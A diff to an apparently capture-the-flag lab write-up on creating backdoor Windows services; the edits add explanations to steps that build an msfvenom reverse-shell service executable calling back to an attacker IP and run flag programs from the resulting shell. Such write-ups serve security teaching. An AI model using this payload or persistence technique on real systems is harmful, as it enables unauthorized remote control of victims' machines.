@@ -7,7 +7,7 @@ This writeup was last updated: 07/05/2023
 
 # Creating Backdoor Services
 1. Started this room's machine
-2. `PowerShell`
+2. `PowerShell` from the compromised Windows machine to open up PowerShell
 3. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<MACHINE IP> LPORT=<PORT NUMBER> -f exe-service -o <PAYLOAD NAME1>.exe`
 ```Bash
 root@ip-10-10-44-151:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.44.151 LPORT=9999 -f exe-service -o rev-svc.exe
@@ -86,7 +86,7 @@ Microsoft Windows [Version 10.0.17763.1821]
 
 C:\Windows\system32>
 ```
-12. `C:\flags\flag7.exe`
+12. `C:\flags\flag7.exe` from our reverse shell to run the flag7.exe program, which ended up displaying this task's flag onto our terminal
 ```PowerShell
 C:\Windows\system32>C:\flags\flag7.exe
 C:\flags\flag7.exe
@@ -209,7 +209,7 @@ Microsoft Windows [Version 10.0.17763.1821]
 
 C:\Windows\system32>
 ```
-12. `C:\flags\flag8.exe`
+12. `C:\flags\flag8.exe` from our reverse shell to run the flag8.exe program, which ended up displaying this task's flag onto our terminal
 ```PowerShell
 C:\Windows\system32>C:\flags\flag8.exe
 C:\flags\flag8.exe
